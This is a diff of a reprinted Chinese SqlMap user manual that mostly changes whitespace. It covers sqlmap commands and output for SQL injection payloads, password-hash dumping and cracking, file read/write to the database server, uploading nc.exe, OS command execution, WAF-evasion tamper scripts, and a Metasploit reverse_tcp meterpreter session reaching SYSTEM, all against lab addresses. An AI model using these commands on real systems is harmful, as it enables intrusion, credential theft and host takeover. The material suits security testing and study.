@@ -2,22 +2,23 @@
 title: SqlMap使用手册
 time: 2016.01.06 21:47:00
 layout: post
+catalog: true
 tags:
 - Security
 - SqlMap
 - Reprinted
 excerpt: 整理的一份非常完整的SqlMap使用手册，几乎完全覆盖SqlMap的所有使用方法
     
+
+
 ---
 
 # SqlMap用户手册
-
 
 ---
 
 
 ## 1.一些基础知识
-
 
 ----
 
@@ -53,11 +54,10 @@ sqlmap支持五种不同的注入模式：
 ---
 
 ### 支持的数据库
- 
+
 SqlMap支持的数据库有：
 
 	MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
-
 ---
 
 可以提供一个简单的URL，Burp或WebScarab请求日志文件，文本文档中的完整http请求或者Google的搜索，匹配出结果页面，也可以自己定义一个正则来判断那个地址去测试。
@@ -89,9 +89,8 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 
 	python sqlmap.py --update
 或者
-	
+​	
 	git pull
-
 ----
 
 ## 2.参数讲解
@@ -125,7 +124,7 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 ### 2.2获取目标方式
 
 #### 从指定url中获得
-	
+
 	参数：-u或者--url
 
 	格式：http(s)://targeturl[:port]/[…]
@@ -150,17 +149,17 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 
 	www.target3.com/vuln3/id/1*
 	从文件中加载HTTP请求
-
+	
 	参数：-r
-
+	
 	sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。
-
+	
 	比如文本文件内如下：
-
+	
 	POST /vuln.php HTTP/1.1
 	Host: www.target.com
 	User-Agent: Mozilla/4.0
-
+	
 	id=1
 	当请求是HTTPS的时候你需要配合这个--force-ssl参数来使用，或者你可以在Host头后门加上:443
 
@@ -176,7 +175,6 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 
 
 	翻墙不能的，可修改配置文件，并使用-c参数加载sqlmap.conf文件里面的相关配置。
-
 ---
 
 ### 2.3请求方式
@@ -226,7 +224,7 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 
 	sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)
 	可以使用--user-agent参数来修改，同时也可以使用--random-agent参数来随机的从./txt/user-agents.txt中获取。
-
+	
 	当--level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入。
 
 #### HTTP Referer头
@@ -306,16 +304,16 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 
 	python sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"
 	避免过多的错误请求被屏蔽
-
+	
 	参数：--safe-url,--safe-freq
-
+	
 	有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。
-
+	
 	绕过这个策略有两种方式：
-
+	
 	1、--safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。
 	2、--safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。
-	
+
 #### 关掉URL参数值编码
 
 	参数：--skip-urlencode
@@ -361,7 +359,7 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 	默认情况系sqlmap会自动的探测web应用后端的数据库是什么，sqlmap支持的数据库有：
 
 	MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、SQLite、Firebird、Sybase、SAP MaxDB、DB2
-	
+
 #### 指定数据库服务器系统
 
 	参数：--os
@@ -390,12 +388,12 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 
 	$query = "SELECT * FROM users WHERE id=(’" . $_GET[’id’] . "’) LIMIT 0, 1";
 	这时你就需要--prefix和--suffix参数了：
-
+	
 	python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "’)" --suffix "AND (’abc’=’abc"
 	这样执行的SQL语句变成：
-
-	$query = "SELECT * FROM users WHERE id=(’1’) <PAYLOAD> AND (’abc’=’abc’) LIMIT 0, 1";
 	
+	$query = "SELECT * FROM users WHERE id=(’1’) <PAYLOAD> AND (’abc’=’abc’) LIMIT 0, 1";
+
 #### 修改注入的数据
 
 	参数：--tamper
@@ -405,31 +403,31 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 下面是一个tamper脚本的格式：
 
 	＃ Needed imports
-	
+
 	from lib.core.enums import PRIORITY
-	
+
 	＃ Define which is the order of application of tamper scripts against
-	
+
 	＃ the payload
-	
+
 	__priority__ = PRIORITY.NORMAL
-	
+
 	def tamper(payload):
-	
+
     	'''
-    	
+
     	Description of your tamper script
-    	
+
     	'''
-    	
+
     	retVal = payload
-    	
+
     	# your code to tamper the original payload
-    	
+
     	# return the tampered payload
-    	
+
     	return retVal
-    
+​    
 
 可以查看 tamper/ 目录下的有哪些可用的脚本
 例如：
@@ -601,11 +599,11 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 	[hh:mm:50] [INFO] found: 'testpass' for user: 'postgres'
 	database management system users password hashes:
 	[*] postgres [1]:
-    	password hash: md5d7d880f96044b72d0bba108ace96d1e4
-    	clear-text password: testpass
+		password hash: md5d7d880f96044b72d0bba108ace96d1e4
+		clear-text password: testpass
 	[*] testuser [1]:
-    	password hash: md599e5ea7a6f7c3269995cba3927fd0093
-    	clear-text password: testpass
+		password hash: md599e5ea7a6f7c3269995cba3927fd0093
+		clear-text password: testpass
 可以看到sqlmap不仅勒出数据库的用户跟密码，同时也识别出是PostgreSQL数据库，并询问用户是否采用字典爆破的方式进行破解，这个爆破已经支持Oracle和Microsoft SQL Server。
 
 也可以提供-U参数来指定爆破哪个用户的hash。
@@ -687,7 +685,7 @@ MySQL例子：
 	| password    | text    |
 	| username    | text    |
 	+-------------+---------+
-
+	
 	Database: owasp10
 	Table: blogs_table
 	[4 columns]
@@ -699,7 +697,7 @@ MySQL例子：
 	| cid          | int(11)  |
 	| comment      | text     |
 	+--------------+----------+
-
+	
 	Database: owasp10
 	Table: hitlog
 	[6 columns]
@@ -713,7 +711,7 @@ MySQL例子：
 	| ip       | text     |
 	| referer  | text     |
 	+----------+----------+
-
+	
 	Database: testdb
 	Table: users
 	[3 columns]
@@ -725,7 +723,7 @@ MySQL例子：
 	| surname | varchar(1000) |
 	+---------+---------------+
 	[...]
-	
+
 #### 获取表中数据个数
 
 	参数：--count
@@ -743,7 +741,7 @@ MySQL例子：
 	| dbo.users      | 4       |
 	| dbo.users_blob | 2       |
 	+----------------+---------+
-	
+
 #### 获取整个表的数据
 
 	参数：--dump,-C,-T,-D,--start,--stop,--first,--last
@@ -811,9 +809,9 @@ sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语�
 	[hh:mm:14] [INFO] fetching SQL SELECT query output: 'SELECT 'foo''
 	[hh:mm:14] [INFO] retrieved: foo
 	SELECT 'foo':    'foo'
-
+	
 	$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo', 'bar'" -v 2
-
+	
 	[...]
 	[hh:mm:50] [INFO] fetching SQL SELECT query output: 'SELECT 'foo', 'bar''
 	[hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now unpack it into 
@@ -827,8 +825,8 @@ sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语�
 	[hh:mm:50] [INFO] retrieved: bar
 	[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
 	SELECT 'foo', 'bar':    'foo, bar'
-	
-	
+
+
 ### 2.8爆破
 
 #### 暴力破解表名
@@ -858,18 +856,18 @@ sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语�
 	back-end DBMS operating system: Windows
 	back-end DBMS: MySQL &lt; 5.0.0
 	banner:    '4.1.21-community-nt'
-
+	
 	[hh:mm:40] [INFO] checking table existence using items from '/software/sqlmap/txt/common-tables.txt'
 	[hh:mm:40] [INFO] adding words used on web page to the check list
 	please enter number of threads? [Enter for 1 (current)] 8
 	[hh:mm:43] [INFO] retrieved: users
-
+	
 	Database: testdb
 	[1 table]
 	+-------+
 	| users |
 	+-------+
-	
+
 #### 暴力破解列名
 
 	参数：--common-columns
@@ -894,26 +892,26 @@ sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语�
 
 	$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther" \
 	--file-read "C:/example.exe" -v 1
-
+	
 	[...]
 	[hh:mm:49] [INFO] the back-end DBMS is Microsoft SQL Server
 	web server operating system: Windows 2000
 	web application technology: ASP.NET, Microsoft IIS 6.0, ASP
 	back-end DBMS: Microsoft SQL Server 2005
-
+	
 	[hh:mm:50] [INFO] fetching file: 'C:/example.exe'
 	[hh:mm:50] [INFO] the SQL query provided returns 3 entries
 	C:/example.exe file saved to:    '/software/sqlmap/output/192.168.136.129/files/	C__example.exe'
 	[...]
-
+	
 	$ ls -l output/192.168.136.129/files/C__example.exe 
 	-rw-r--r-- 1 inquis inquis 2560 2011-MM-DD hh:mm output/192.168.136.129/files/C__example.exe
-
+	
 	$ file output/192.168.136.129/files/C__example.exe 
 	output/192.168.136.129/files/C__example.exe: PE32 executable for MS Windows (GUI) Intel
 	80386 32-bit
-	
-	
+
+
 #### 把文件上传到数据库服务器中
 
 	参数：--file-write,--file-dest
@@ -924,27 +922,27 @@ sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语�
 
 	$ file /software/nc.exe.packed 
 	/software/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32-bit
-
+	
 	$ ls -l /software/nc.exe.packed
 	-rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed
-
+	
 	$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" --file-write \
 	"/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1
-
+	
 	[...]
 	[hh:mm:29] [INFO] the back-end DBMS is MySQL
 	web server operating system: Windows 2003 or 2008
 	web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727
 	back-end DBMS: MySQL &gt;= 5.0.0
-
+	
 	[...]
 	do you want confirmation that the file 'C:/WINDOWS/Temp/nc.exe' has been successfully 
 	written on the back-end DBMS file system? [Y/n] y
 	[hh:mm:52] [INFO] retrieved: 31744
 	[hh:mm:52] [INFO] the file has been successfully written and its size is 31744 bytes, 
 	same size as the local file '/software/nc.exe.packed'
-	
-	
+
+
 ####  运行任意操作系统命令
 
 	参数：--os-cmd,--os-shell
@@ -959,7 +957,7 @@ sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语�
 
 	$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" \
 	--os-cmd id -v 1
-
+	
 	[...]
 	web application technology: PHP 5.2.6, Apache 2.2.9
 	back-end DBMS: PostgreSQL
@@ -973,7 +971,7 @@ sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语�
 	[hh:mm:12] [INFO] creating UDF 'sys_exec' from the binary UDF file
 	do you want to retrieve the command standard output? [Y/n/a] y
 	command standard output:    'uid=104(postgres) gid=106(postgres) groups=106(postgres)'
-
+	
 	[hh:mm:19] [INFO] cleaning up the database management system
 	do you want to remove UDF 'sys_eval'? [Y/n] y
 	do you want to remove UDF 'sys_exec'? [Y/n] y
@@ -1050,49 +1048,49 @@ sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语�
 	> 
 	[hh:mm:40] [INFO] creation in progress ... done
 	[hh:mm:43] [INFO] running Metasploit Framework command line interface locally, please wait..
-
+	
 	                                _
 	                                | |      o
 	_  _  _    _ _|_  __,   ,    _  | |  __    _|_
 	/ |/ |/ |  |/  |  /  |  / \_|/ \_|/  /  \_|  |
 	|  |  |_/|__/|_/\_/|_/ \/ |__/ |__/\__/ |_/|_/
-    	                    /|
-    	                    \|
+		                    /|
+		                    \|
 
 
     =[ metasploit v3.7.0-dev [core:3.7 api:1.0]
-	+ -- --=[ 674 exploits - 351 auxiliary
-	+ -- --=[ 217 payloads - 27 encoders - 8 nops
+    + -- --=[ 674 exploits - 351 auxiliary
+    + -- --=[ 217 payloads - 27 encoders - 8 nops
     	=[ svn r12272 updated 4 days ago (2011.04.07)
-
-	PAYLOAD =&gt; windows/meterpreter/reverse_tcp
-	EXITFUNC =&gt; thread
-	LPORT =&gt; 60641
-	LHOST =&gt; 192.168.136.1
-	[*] Started reverse handler on 192.168.136.1:60641 
-	[*] Starting the payload handler...
-	[hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF 'sys_bineval', 
-	please wait..
-	[*] Sending stage (749056 bytes) to 192.168.136.129
-	[*] Meterpreter session 1 opened (192.168.136.1:60641 -&gt; 192.168.136.129:1689) at Mon Apr 11 
-	hh:mm:52 +0100 2011
-
-	meterpreter &gt; Loading extension espia...success.
-	meterpreter &gt; Loading extension incognito...success.
-	meterpreter &gt; [-] The 'priv' extension has already been loaded.
-	meterpreter &gt; Loading extension sniffer...success.
-	meterpreter &gt; System Language : en_US
-	OS              : Windows .NET Server (Build 3790, Service Pack 2).
-	Computer        : W2K3R2
-	Architecture    : x86
-	Meterpreter     : x86/win32
-	meterpreter &gt; Server username: NT AUTHORITY\SYSTEM
-	meterpreter &gt; ipconfig
-
-	MS TCP Loopback interface
-	Hardware MAC: 00:00:00:00:00:00
-	IP Address  : 127.0.0.1
-	Netmask     : 255.0.0.0
+    
+    PAYLOAD =&gt; windows/meterpreter/reverse_tcp
+    EXITFUNC =&gt; thread
+    LPORT =&gt; 60641
+    LHOST =&gt; 192.168.136.1
+    [*] Started reverse handler on 192.168.136.1:60641 
+    [*] Starting the payload handler...
+    [hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF 'sys_bineval', 
+    please wait..
+    [*] Sending stage (749056 bytes) to 192.168.136.129
+    [*] Meterpreter session 1 opened (192.168.136.1:60641 -&gt; 192.168.136.129:1689) at Mon Apr 11 
+    hh:mm:52 +0100 2011
+    
+    meterpreter &gt; Loading extension espia...success.
+    meterpreter &gt; Loading extension incognito...success.
+    meterpreter &gt; [-] The 'priv' extension has already been loaded.
+    meterpreter &gt; Loading extension sniffer...success.
+    meterpreter &gt; System Language : en_US
+    OS              : Windows .NET Server (Build 3790, Service Pack 2).
+    Computer        : W2K3R2
+    Architecture    : x86
+    Meterpreter     : x86/win32
+    meterpreter &gt; Server username: NT AUTHORITY\SYSTEM
+    meterpreter &gt; ipconfig
+    
+    MS TCP Loopback interface
+    Hardware MAC: 00:00:00:00:00:00
+    IP Address  : 127.0.0.1
+    Netmask     : 255.0.0.0
 
 
 
@@ -1132,7 +1130,7 @@ sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语�
 需要配合之前三个参数使用，例子：
 
 	$ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --reg-add --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1
-	
+
 ### 3.2常规参数
 
 #### 从sqlite中读取session
@@ -1177,8 +1175,8 @@ sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语�
 	[xx:xx:54] [INFO] heuristics detected web page charset 'ascii'
 	[xx:xx:00] [INFO] 42/56 links visited (75%)
 	[...]
-	
-	
+
+
 #### 规定输出到CSV中的分隔符
 
 	参数：--csv-del
@@ -1218,7 +1216,7 @@ sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语�
 
 	100% [===================================================] 64/64
 	[hh:mm:53] [INFO] retrieved: Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod
-
+	
 	web application technology: PHP 5.2.6, Apache 2.2.9
 	back-end DBMS: Oracle
 	banner:    'Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod'
@@ -1285,7 +1283,7 @@ sqlmap默认把session文件跟结果文件保存在output文件夹下，用此�
 	<b>/sqlmap/mssql/iis/get_int.asp, line 27</b>'
 	[11:12:17] [INFO] target URL appears to have 3 columns in query
 	[...]
-	
+
 ### 3.3其他的一些参数
 
 #### 使用参数缩写
@@ -1304,8 +1302,8 @@ sqlmap默认把session文件跟结果文件保存在output文件夹下，用此�
 可以写成：
 
 	python sqlmap.py -z "ign,flu,bat,tec=U,dump,D=testdb,T=users" -u "www.target.com/vuln.php?id=1"
-	
-	
+
+​	
 #### 成功SQL注入时警告
 
 	参数：--alert
@@ -1322,7 +1320,7 @@ sqlmap默认把session文件跟结果文件保存在output文件夹下，用此�
 	heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
 	[xx:xx:56] [INFO] do you want to include all tests for 'MySQL' extending provided level (1) and risk (1)? [Y/n] N
 	[...]
-	
+
 #### 发现SQL注入时发出蜂鸣声
 
 	参数：--beep
@@ -1400,7 +1398,7 @@ sqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目
 	[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'ModSecurity: Open Source Web Application Firewall (Trustwave)'
 	[xx:xx:23] [CRITICAL] WAF/IDS/IPS identified 'ModSecurity: Open Source Web Application Firewall (Trustwave)'. Please consider usage of tamper scripts (option '--tamper')
 	[...]
-	
+
 #### 模仿智能手机
 
 	参数：--mobile
@@ -1421,7 +1419,7 @@ sqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目
 	[7] Samsung Galaxy S
 	> 1
 	[...]
-	
+
 #### 安全的删除output目录的文件
 
 	参数：--purge-output
@@ -1440,7 +1438,7 @@ sqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目
 	[xx:xx:55] [DEBUG] renaming directory names to random values
 	[xx:xx:55] [DEBUG] deleting the whole directory tree
 	[...]
-	
+
 #### 启发式判断注入
 
 	参数：--smart
@@ -1482,7 +1480,7 @@ sqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目
 	[xx:xx:24] [INFO] target URL appears to have 3 columns in query
 	[xx:xx:24] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
 	[...]
-	
+
 #### 初级用户向导参数
 
 	参数：--wizard 面向初级用户的参数，可以一步一步教你如何输入针对目标注入。
@@ -1509,9 +1507,9 @@ sqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目
 	[2] Smart
 	[3] All
 	> 1
-
+	
 	sqlmap is running, please wait..
-
+	
 	heuristic (parsing) test showed that the back-end DBMS could be 'Microsoft SQL Server'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
 	do you want to include all tests for 'Microsoft SQL Server' extending provided level (1) 	and risk (1)? [Y/n] Y
 	GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
@@ -1519,29 +1517,29 @@ sqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目
 	---
 	Place: GET
 	Parameter: id
-    	Type: boolean-based blind
-    	Title: AND boolean-based blind - WHERE or HAVING clause
-    	Payload: id=1 AND 2986=2986
-
-    	Type: error-based
-    	Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause
-    	Payload: id=1 AND 4847=CONVERT(INT,(CHAR(58) CHAR(118) CHAR(114) CHAR(100) CHAR(58) 	(SELECT (CASE WHEN (4847=4847) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(111) 	CHAR(109) CHAR(113) CHAR(58)))
-
-    	Type: UNION query
-    	Title: Generic UNION query (NULL) - 3 columns
-    	Payload: id=1 UNION ALL SELECT NULL,NULL,CHAR(58) CHAR(118) CHAR(114) CHAR(100) CHAR(58) CHAR(70) CHAR(79) CHAR(118) CHAR(106) CHAR(87) CHAR(101) CHAR(119) CHAR(115) CHAR(114) CHAR(77) CHAR(58) CHAR(111) CHAR(109) CHAR(113) CHAR(58)-- 
-
-    	Type: stacked queries
-    	Title: Microsoft SQL Server/Sybase stacked queries
-    	Payload: id=1; WAITFOR DELAY '0:0:5'--
-
-    	Type: AND/OR time-based blind
-    	Title: Microsoft SQL Server/Sybase time-based blind
-    	Payload: id=1 WAITFOR DELAY '0:0:5'--
-
-    	Type: inline query
-    	Title: Microsoft SQL Server/Sybase inline queries
-    	Payload: id=(SELECT CHAR(58) CHAR(118) CHAR(114) CHAR(100) CHAR(58) (SELECT (CASE WHEN 	(6382=6382) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(111) CHAR(109) CHAR(113) CHAR(58))
+		Type: boolean-based blind
+		Title: AND boolean-based blind - WHERE or HAVING clause
+		Payload: id=1 AND 2986=2986
+	
+		Type: error-based
+		Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause
+		Payload: id=1 AND 4847=CONVERT(INT,(CHAR(58) CHAR(118) CHAR(114) CHAR(100) CHAR(58) 	(SELECT (CASE WHEN (4847=4847) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(111) 	CHAR(109) CHAR(113) CHAR(58)))
+	
+		Type: UNION query
+		Title: Generic UNION query (NULL) - 3 columns
+		Payload: id=1 UNION ALL SELECT NULL,NULL,CHAR(58) CHAR(118) CHAR(114) CHAR(100) CHAR(58) CHAR(70) CHAR(79) CHAR(118) CHAR(106) CHAR(87) CHAR(101) CHAR(119) CHAR(115) CHAR(114) CHAR(77) CHAR(58) CHAR(111) CHAR(109) CHAR(113) CHAR(58)-- 
+	
+		Type: stacked queries
+		Title: Microsoft SQL Server/Sybase stacked queries
+		Payload: id=1; WAITFOR DELAY '0:0:5'--
+	
+		Type: AND/OR time-based blind
+		Title: Microsoft SQL Server/Sybase time-based blind
+		Payload: id=1 WAITFOR DELAY '0:0:5'--
+	
+		Type: inline query
+		Title: Microsoft SQL Server/Sybase inline queries
+		Payload: id=(SELECT CHAR(58) CHAR(118) CHAR(114) CHAR(100) CHAR(58) (SELECT (CASE WHEN 	(6382=6382) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(111) CHAR(109) CHAR(113) CHAR(58))
 	---
 	web server operating system: Windows XP
 	web application technology: ASP, Microsoft IIS 5.1
@@ -1550,13 +1548,13 @@ sqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目
 	banner:	
 	---
 	Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) 
-    	Oct 14 2005 00:33:37 
-    	Copyright (c) 1988-2005 Microsoft Corporation
-    	Express Edition on Windows NT 5.1 (Build 2600: Service Pack 2)
+		Oct 14 2005 00:33:37 
+		Copyright (c) 1988-2005 Microsoft Corporation
+		Express Edition on Windows NT 5.1 (Build 2600: Service Pack 2)
 	---
 	current user:    'sa'
 	current database:    'testdb'
 	current user is DBA:    True
-
+	
 	[*] shutting down at 11:25:52
 【原文：sqlmap用户手册  整理发布@小西】
